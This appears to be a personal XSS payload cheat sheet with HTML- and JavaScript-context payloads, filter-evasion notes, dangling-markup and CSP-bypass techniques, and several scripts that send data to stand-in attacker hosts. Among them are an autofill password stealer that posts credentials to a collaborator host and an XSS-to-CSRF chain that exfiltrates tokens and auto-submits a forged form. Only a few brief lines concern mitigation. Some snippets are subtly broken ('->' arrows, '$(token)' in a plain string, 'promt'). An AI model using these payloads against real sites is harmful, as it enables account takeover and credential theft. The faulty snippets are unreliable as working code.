
```
- Common Payloads



- XSS Chained for CSRF

```


#### HTML context

Note

- tags - `script, img, svg, svg animate `

- event handlers -  `onerror, onmouseover, onfocus, autofocus onfocus, onbegin`

- functions -   `prompt, confirm, window.location("https://evil.com"), print`

- if tag is hidden make use of AccessKey payload

```
<script>alert(1)</script>

<script>alert`1`</script>

<img src=1 onerror=alert(1)>

<a href="javascript:alert(1)">

"><svg/onload=alert(1)>
"><svg/onmouseover=promt(1)>
"><svg/onfocus=promt(1)>
"><svg/onload=confirm(1)>
"><svg/onmouseover=confirm(1)>
"><svg/onfocus=confirm(1)>
"><svg/onload=window.location("https://evil.com")>
"><svg/onmouseover=window.location("https://evil.com")>
"><svg/onfocus=window.location("https://evil.com")>
"><svg autofocus onfocus=window.location("https://evil.com")>

"><svg><animatetransform onbegin=alert(1)>

<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

<input type="hidden" accesskey="X" onclick="alert(1)">

```
#### Javsscript Context

Note

- if ' is ecaped then add \ in the begining of payload,  it will escape the / and payload will be successful.
- if ' is blocked then use html encoded &apos;
- if ; are blocked then use {}
- if () are blocked then use `throw` in javascript (https://esdiscuss.org/topic/hacking-onerror-throw)
- if the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...}

```
";window.location="https://evil.com";//996

'-alert(1)-'
';alert(1)//

\';alert(1)//

&apos;-alert(document.domain)-&apos;

'; onerror=alert;throw 1;' 
'; {onerror=alert}throw 1;' 
'; throw onerror = alert, 1;' 
'; onerror=eval;throw'=alert\x281\x29';' 

${alert(1)}

```

#### XSS - Dangling Markup HTML Scriptless Injection

https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html

This technique can be use to extract information from a user when an HTML injection is found. This is very useful if you don't find any way to exploit a XSS but you can inject some HTML tags.

```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
<table background='//your-collaborator-id.burpcollaborator.net?'
<style>@import//hackvertor.co.uk?
<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />
```
If you inject `<img src='http://evil.com/log.cgi?` when the page is loaded the victim will send you all the code between the injected img tag and the next quote.

If the img tag is forbidden (due to CSP for example) you can also use `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`

You could also use `<table background='//your-collaborator-id.burpcollaborator.net?'`

You can also abuse CSS @import (will send all the code until it find a ";")

You can use Meta tag performing a redirect (in 5s in this case `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`. This can be mitigated with a CSP regarding http-equiv ( Content-Security-Policy: default-src 'self';, or Content-Security-Policy: http-equiv 'self';)

#### CSP Bypass - With User Interaction- by Dangling Markup with with base target

https://www.youtube.com/watch?v=XKGjuDlx_1A
https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html#bypassing-csp-with-user-interaction

Content-Security-Policy: default-src 'self' script-src 'self' img-src 'self' object-src 'none' style-src 'self' base-uri 'self' form-action 'self'

Above CSP is very strict as it blocks inline scripts and scripts from img src...however note that even in strict CSP HTML injection is not restricted

What we can do is inject an anchor tag with our attacker server link followed by a `base` tag which has parameter called target. now whatever the value of this target is ssomething which we can access on our attacker server using `window.name`. So we will basically open and double quote for this target attribute but wont close it...so all the the data after this tag including CSRF ..untill there is another closing double quote would be sent to our attacker server and we can access that using window.name

```
<a href="https://attackerserver">click me</a><base target="test
```
Note that you will ask the victim to click on a link that will redirect him to payload controlled by you.
As you control the page where the victim is accessing by clicking the link, you can access that window.name and exfiltrate that data:
```
<script>
  if(window.name) {
      new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```

Mitigation
- You can protect against the base tag injection by having your own base tag before any potential injection, this will prevent the second base tag from being able to overwrite the target.
- Output Encoding

#### CSP Bypass - With User Interaction - DOM-based dangling markup without the base tag

https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html#bypassing-csp-with-user-interaction

Even from the most CSP restricted environments you can still exfiltrate data with some user interaction. In this occasion we are going to use the payload



#### CSP Bypass using `report-uri` and `script-src-elem` directive

You may encounter a website that reflects input into the actual policy, most likely in a `report-uri` directive of CSP. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. We can inject `script-src-elem` directive which will overwrite `script-src`, so we can basically inject the `unsafe-inline` which will inine script ie our payloads.

Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; `report-uri /csp-report?token=`

```
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27


Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'

# Angular template Context

#### XSS to steal auto-fill password

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

#### XSS for CSRF 

The app was fetching updated CSRF token everytime through a URL, we utilised that url to fetch latest csrf token and using  XSS sent it to attacker server in query parameter of URL which is hosting CSRF poc and the poc automatically fetch token from query parameter and executed poc successfully.

note - convert space and special characters into url encoding
     - edit host file of server to attackerserver.com and start http server on port 1234
```
<script>
fetch('https://vulnerable.com/somepage.do?Token)
    .then(response -> response.text())
        .then(data -> getcsrf(data));

function getcsrf(data){
    var token = data;
    window.location.replace('http://attackerserver.com:1234/csrfpoc.html?token=$(token)')
}
</script>
```
CSRF POC
```
<html>
<body>
<form>
...
<input type="hidden" name="formCsrfToken" id=="token" value="" />
...
</form>
</body>

<script>
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const token = urlParams.get('token');
var elem = document.getElementById("token");
elem.value = token;
history.pushState('','','/');
document.forms[0].submit();
</script>

</html>
```